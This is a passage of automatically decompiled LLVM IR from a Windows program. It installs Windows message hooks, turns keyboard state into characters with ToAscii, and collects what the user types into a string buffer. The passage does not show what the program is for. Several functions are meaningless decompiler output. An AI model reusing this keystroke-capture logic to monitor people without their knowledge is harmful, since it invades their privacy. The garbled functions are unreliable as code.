  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6a4, align 4, !insn.addr !676
  %2 = add i32 %1, -1, !insn.addr !676
  store i32 %2, i32* @global_var_40a6a4, align 4, !insn.addr !676
  ret i32 %0, !insn.addr !677
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !678
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !679
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !679
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !679
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !680
  %4 = call i32 @function_407250(), !insn.addr !681
  %5 = icmp ne i32 %4, 0, !insn.addr !682
  %6 = icmp eq i1 %5, false, !insn.addr !683
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !684
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !684

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_4072ec(), !insn.addr !685
  %8 = call i32 @"@LStrDelete"(), !insn.addr !686
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !687
  br label %dec_label_pc_4050bb, !insn.addr !687

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_4072ec(), !insn.addr !688
  %10 = call i32 @"@LStrDelete"(), !insn.addr !689
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !690
  br label %dec_label_pc_4050bb, !insn.addr !690

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !691
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !692
  %14 = udiv i32 %1, 65536, !insn.addr !693
  %15 = and i32 %14, 255, !insn.addr !694
  %16 = inttoptr i32 %15 to i16*, !insn.addr !695
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !696
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !697
  %19 = icmp eq i32 %18, 1, !insn.addr !698
  %20 = icmp eq i1 %19, false, !insn.addr !699
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !699
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !699

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406fb4(), !insn.addr !700
  %22 = icmp eq i32 %21, 0, !insn.addr !701
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !702
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !702

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !703
  %24 = icmp sgt i32 %23, 15, !insn.addr !704
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !704
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !704

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_4072ec(), !insn.addr !705
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !706
  %27 = call i32 @"@LStrInsert"(), !insn.addr !707
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !707
  br label %dec_label_pc_4050bb, !insn.addr !707

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !708
  %29 = load i32, i32* %28, align 4, !insn.addr !708
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !709
  %30 = add i32 %esp.0.reload, 8, !insn.addr !710
  %31 = inttoptr i32 %30 to i32*, !insn.addr !710
  store i32 4215003, i32* %31, align 4, !insn.addr !710
  %32 = call i32 @"@LStrClr"(), !insn.addr !711
  ret i32 %32, !insn.addr !712
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !713
  ret i32 %0, !insn.addr !713
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !714
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !715
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !716
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !716
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !716
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !717
  %2 = call i32 @function_407250(), !insn.addr !718
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !719
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !720
  %4 = add i32 %1, 8, !insn.addr !721
  %5 = inttoptr i32 %4 to i32*, !insn.addr !721
  store i32 4215210, i32* %5, align 4, !insn.addr !721
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !722
  ret i32 %6, !insn.addr !723
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !724
  ret i32 %0, !insn.addr !724
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !725
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !726
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !727
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !728
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !728
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !728
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !729
  %3 = call i32 @function_4071c0(), !insn.addr !730
  %4 = icmp eq i32 %3, 0, !insn.addr !731
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !732
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !732

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !733
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !734
  %7 = ptrtoint i32* %6 to i32, !insn.addr !734
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !735
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !735
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !736
  %10 = icmp eq i1 %9, false, !insn.addr !737
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !738

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_407020(), !insn.addr !739
  %12 = call i32 @"@LStrAsg"(), !insn.addr !740
  %13 = call i32 @function_407348(), !insn.addr !741
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !742
  br label %dec_label_pc_405214, !insn.addr !742

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_40747c(), !insn.addr !743
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !743
  br label %dec_label_pc_405214, !insn.addr !743

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !744
  %16 = load i32, i32* %15, align 4, !insn.addr !744
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !745
  %17 = add i32 %esp.0.reload, 8, !insn.addr !746
  %18 = inttoptr i32 %17 to i32*, !insn.addr !746
  store i32 4215345, i32* %18, align 4, !insn.addr !746
  %19 = call i32 @"@LStrClr"(), !insn.addr !747
  ret i32 %19, !insn.addr !748
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !749
  ret i32 %0, !insn.addr !749
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !750
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !751
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !752
  %8 = inttoptr i32 %4 to i8*, !insn.addr !752
  store i8 %7, i8* %8, align 1, !insn.addr !752
  %9 = add i32 %2, 111, !insn.addr !753
  %10 = inttoptr i32 %9 to i8*, !insn.addr !753
  %11 = load i8, i8* %10, align 1, !insn.addr !753
  %12 = load i32, i32* %eax, align 4, !insn.addr !753
  %13 = trunc i32 %12 to i8, !insn.addr !753
  %14 = add i8 %11, %13, !insn.addr !753
  store i8 %14, i8* %10, align 1, !insn.addr !753
  %15 = trunc i32 %3 to i16, !insn.addr !754
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !754
  %17 = inttoptr i32 %0 to i32*, !insn.addr !754
  store i32 %16, i32* %17, align 4, !insn.addr !754
  %18 = add i32 %0, 66, !insn.addr !755
  %19 = inttoptr i32 %18 to i64*, !insn.addr !755
  %20 = load i64, i64* %19, align 4, !insn.addr !755
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !755
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !756
  %22 = load i8, i8* %5, align 4, !insn.addr !757
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !757
  %25 = add i8 %22, %24, !insn.addr !757
  %26 = inttoptr i32 %23 to i8*, !insn.addr !757
  store i8 %25, i8* %26, align 1, !insn.addr !757
  %27 = add i32 %21, -117, !insn.addr !758
  %28 = inttoptr i32 %27 to i8*, !insn.addr !758
  %29 = load i8, i8* %28, align 1, !insn.addr !758
  %30 = trunc i32 %3 to i8, !insn.addr !758
  %31 = add i8 %29, %30, !insn.addr !758
  store i8 %31, i8* %28, align 1, !insn.addr !758
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !759
  %33 = add i32 %21, 16, !insn.addr !760
  %34 = inttoptr i32 %33 to i32*, !insn.addr !760
  %35 = load i32, i32* %34, align 4, !insn.addr !760
  %36 = add i32 %21, 12, !insn.addr !761
  %37 = inttoptr i32 %36 to i32*, !insn.addr !761
  %38 = load i32, i32* %37, align 4, !insn.addr !761
  %39 = add i32 %21, 8, !insn.addr !762
  %40 = inttoptr i32 %39 to i32*, !insn.addr !762
  %41 = load i32, i32* %40, align 4, !insn.addr !762
  %42 = load i32, i32* inttoptr (i32 4231468 to i32*), align 4, !insn.addr !763
  %43 = inttoptr i32 %42 to i32*, !insn.addr !764
  %44 = load i32, i32* %43, align 4, !insn.addr !764
  %45 = icmp eq i32 %44, 0, !insn.addr !764
  %46 = icmp eq i1 %45, false, !insn.addr !765
  %47 = icmp eq i32 %41, 0, !insn.addr !766
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !767
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !768

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !769
  %51 = add i32 %35, 4, !insn.addr !770
  %52 = inttoptr i32 %51 to i32*, !insn.addr !770
  %53 = load i32, i32* %52, align 4, !insn.addr !770
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !771
  br label %dec_label_pc_40529a, !insn.addr !772

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !773
  br label %dec_label_pc_40529a, !insn.addr !773

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_40a6ac, align 4, !insn.addr !774
  %57 = inttoptr i32 %35 to i32*, !insn.addr !775
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !775
  ret i32 %58, !insn.addr !776
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40912c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !777
  %5 = icmp eq i1 %4, false, !insn.addr !778
  %6 = icmp eq i32 %arg3, 0, !insn.addr !779
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !780

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !781
  %9 = inttoptr i32 %8 to i32*, !insn.addr !781
  %10 = load i32, i32* %9, align 4, !insn.addr !781
  %11 = icmp eq i32 %10, 2, !insn.addr !782
  %12 = icmp eq i1 %11, false, !insn.addr !783
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !783

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !784
  br label %dec_label_pc_4052e0, !insn.addr !784

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_40a6b0, align 4, !insn.addr !785
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !786
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !786
  ret i32 %16, !insn.addr !787
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_40a650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !788
  %2 = ptrtoint i32* %1 to i32, !insn.addr !788
  store i32 %2, i32* @global_var_40a6ac, align 4, !insn.addr !789
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_40a650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !790
  %5 = ptrtoint i32* %4 to i32, !insn.addr !790
  store i32 %5, i32* @global_var_40a6b0, align 4, !insn.addr !791
  ret i32 %5, !insn.addr !792
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_40a6ac, align 4, !insn.addr !793
  %1 = inttoptr i32 %0 to i32*, !insn.addr !794
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !794
  %3 = load i32, i32* @global_var_40a6b0, align 4, !insn.addr !795
  %4 = inttoptr i32 %3 to i32*, !insn.addr !796
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !796
  %6 = sext i1 %5 to i32, !insn.addr !796
  ret i32 %6, !insn.addr !797
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !798
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !798
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !798
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !799
  %2 = load i32, i32* @global_var_40a6a8, align 4, !insn.addr !800
  %3 = add i32 %2, 1, !insn.addr !800
  store i32 %3, i32* @global_var_40a6a8, align 4, !insn.addr !800
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !801
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !802
  ret i32 0, !insn.addr !803
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !804
  ret i32 %0, !insn.addr !804
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !805
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !806
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6a8, align 4, !insn.addr !807
  %2 = add i32 %1, -1, !insn.addr !807
  store i32 %2, i32* @global_var_40a6a8, align 4, !insn.addr !807
  ret i32 %0, !insn.addr !808
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !809
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !809
  %5 = inttoptr i32 %3 to i32*, !insn.addr !809
  store i32 %4, i32* %5, align 4, !insn.addr !809
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !810
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !810
  %10 = add i8 %7, %9, !insn.addr !810
  %11 = inttoptr i32 %8 to i8*, !insn.addr !810
  store i8 %10, i8* %11, align 1, !insn.addr !810
  %12 = load i32, i32* %eax, align 4, !insn.addr !811
  store i32 %arg1, i32* %eax, align 4, !insn.addr !812
  %13 = add i32 %12, 99, !insn.addr !813
  %14 = inttoptr i32 %13 to i64*, !insn.addr !813
  %15 = load i64, i64* %14, align 4, !insn.addr !813
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !813
  %17 = add i32 %16, -2, !insn.addr !814
  %18 = inttoptr i32 %17 to i16*, !insn.addr !814
  store i16 27241, i16* %18, align 2, !insn.addr !814
  %19 = mul i32 %2, 2, !insn.addr !815
  %20 = add i32 %2, 110, !insn.addr !815
  %21 = add i32 %20, %19, !insn.addr !815
  %22 = inttoptr i32 %21 to i32*, !insn.addr !815
  %23 = load i32, i32* %22, align 4, !insn.addr !815
  %24 = sext i32 %23 to i64, !insn.addr !815
  %25 = mul nsw i64 %24, 111, !insn.addr !815
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !815
  %28 = icmp eq i64 %25, %27, !insn.addr !815
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !816

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !817
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !818

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !817
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !819

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !817
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !564, !insn.addr !817
  %33 = and i8 %32, 1, !insn.addr !817
  %34 = icmp eq i8 %33, 0, !insn.addr !817
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !820

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !811
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !821
  %37 = load i32, i32* %36, align 4, !insn.addr !821
  %38 = xor i32 %37, %1, !insn.addr !821
  store i32 %38, i32* %36, align 4, !insn.addr !821
  %39 = add i32 %1, 959985462, !insn.addr !822
  %40 = inttoptr i32 %39 to i32*, !insn.addr !822
  %41 = load i32, i32* %40, align 4, !insn.addr !822
  %42 = xor i32 %41, %1, !insn.addr !822
  %43 = add i32 %16, -38, !insn.addr !823
  %44 = inttoptr i32 %43 to i32*, !insn.addr !823
  store i32 %35, i32* %44, align 4, !insn.addr !823
  %45 = add i32 %16, -42, !insn.addr !824
  %46 = inttoptr i32 %45 to i32*, !insn.addr !824
  store i32 %42, i32* %46, align 4, !insn.addr !824
  %47 = add i32 %16, -22, !insn.addr !825
  %48 = inttoptr i32 %47 to i32*, !insn.addr !825
  store i32 0, i32* %48, align 4, !insn.addr !825
  %49 = add i32 %16, -26, !insn.addr !826
  %50 = inttoptr i32 %49 to i32*, !insn.addr !826
  store i32 0, i32* %50, align 4, !insn.addr !826
  %51 = add i32 %16, -30, !insn.addr !827
  %52 = inttoptr i32 %51 to i32*, !insn.addr !827
  store i32 0, i32* %52, align 4, !insn.addr !827
  %53 = add i32 %16, -34, !insn.addr !828
  %54 = inttoptr i32 %53 to i32*, !insn.addr !828
  store i32 0, i32* %54, align 4, !insn.addr !828
  %55 = add i32 %16, -6, !insn.addr !829
  %56 = inttoptr i32 %55 to i32*, !insn.addr !829
  store i32 %arg3, i32* %56, align 4, !insn.addr !829
  %57 = add i32 %16, -46, !insn.addr !830
  %58 = inttoptr i32 %57 to i32*, !insn.addr !830
  store i32 %17, i32* %58, align 4, !insn.addr !830
  ret i32 0, !insn.addr !830

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !831
  %60 = trunc i64 %25 to i32, !insn.addr !815
  %61 = load i32, i32* %eax, align 4, !insn.addr !832
  %62 = add i32 %61, 1, !insn.addr !832
  %63 = mul i32 %59, 8, !insn.addr !833
  %64 = add i32 %59, 48, !insn.addr !833
  %65 = add i32 %64, %63, !insn.addr !833
  %66 = inttoptr i32 %65 to i8*, !insn.addr !833
  %67 = load i8, i8* %66, align 4, !insn.addr !833
  %68 = udiv i32 %62, 256, !insn.addr !833
  %69 = trunc i32 %68 to i8, !insn.addr !833
  %70 = add i8 %67, %69, !insn.addr !833
  store i8 %70, i8* %66, align 4, !insn.addr !833
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !834
  %71 = call i32 @"@LStrClr"(), !insn.addr !835
  %72 = call i32 @function_4034c8(), !insn.addr !836
  %73 = add i32 %60, -8, !insn.addr !837
  %74 = inttoptr i32 %73 to i32*, !insn.addr !837
  store i32 %72, i32* %74, align 4, !insn.addr !837
  %75 = ashr i32 %72, 31, !insn.addr !838
  %76 = zext i32 %72 to i64, !insn.addr !839
  %77 = zext i32 %75 to i64, !insn.addr !839
  %78 = mul i64 %77, 4294967296, !insn.addr !839
  %79 = or i64 %78, %76, !insn.addr !839
  %80 = sdiv i64 %79, 3, !insn.addr !839
  %81 = trunc i64 %80 to i32, !insn.addr !839
  store i32 %81, i32* %eax, align 4, !insn.addr !839
  %82 = srem i64 %79, 3, !insn.addr !839
  %83 = trunc i64 %82 to i32, !insn.addr !839
  %84 = icmp eq i32 %83, 0, !insn.addr !840
  %85 = icmp eq i1 %84, false, !insn.addr !841
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !841

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !842
  %87 = ashr i32 %86, 31, !insn.addr !843
  %88 = zext i32 %86 to i64, !insn.addr !844
  %89 = zext i32 %87 to i64, !insn.addr !844
  %90 = mul i64 %89, 4294967296, !insn.addr !844
  %91 = or i64 %90, %88, !insn.addr !844
  %92 = sdiv i64 %91, 3, !insn.addr !844
  %93 = trunc i64 %92 to i32, !insn.addr !844
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !845
  br label %dec_label_pc_405430, !insn.addr !845

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !845

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !846
  ret i32 %94, !insn.addr !846

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !847
  %96 = zext i32 %95 to i64, !insn.addr !847
  %97 = zext i32 %arg3 to i64, !insn.addr !847
  %98 = mul i64 %97, 4294967296, !insn.addr !847
  %99 = or i64 %98, %96, !insn.addr !847
  %100 = zext i32 %arg2 to i64, !insn.addr !847
  %101 = sdiv i64 %99, %100, !insn.addr !847
  %102 = trunc i64 %101 to i32, !insn.addr !847
  %103 = add i32 %102, 1, !insn.addr !848
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !848
  br label %dec_label_pc_405430, !insn.addr !848

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !849
  ret i32 %104, !insn.addr !850

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !851
  %106 = load i32, i32* %105, align 4, !insn.addr !851
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !851
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !852
  %109 = load i32, i32* %108, align 4, !insn.addr !852
  %110 = add i32 %109, %107, !insn.addr !852
  store i32 %110, i32* %108, align 4, !insn.addr !852
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !853
  %113 = inttoptr i32 %112 to i8*, !insn.addr !853
  %114 = load i8, i8* %113, align 1, !insn.addr !853
  %115 = trunc i32 %111 to i8, !insn.addr !853
  %116 = add i8 %114, %115, !insn.addr !853
  store i8 %116, i8* %113, align 1, !insn.addr !853
  %117 = load i32, i32* %eax, align 4, !insn.addr !854
  ret i32 %117, !insn.addr !854
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !855
  %esp.0.reg2mem = alloca i32, !insn.addr !855
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !856
  %3 = inttoptr i32 %2 to i32*, !insn.addr !856
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !857
  %13 = inttoptr i32 %12 to i32*, !insn.addr !857
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !855
  br label %dec_label_pc_40543e, !insn.addr !855

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
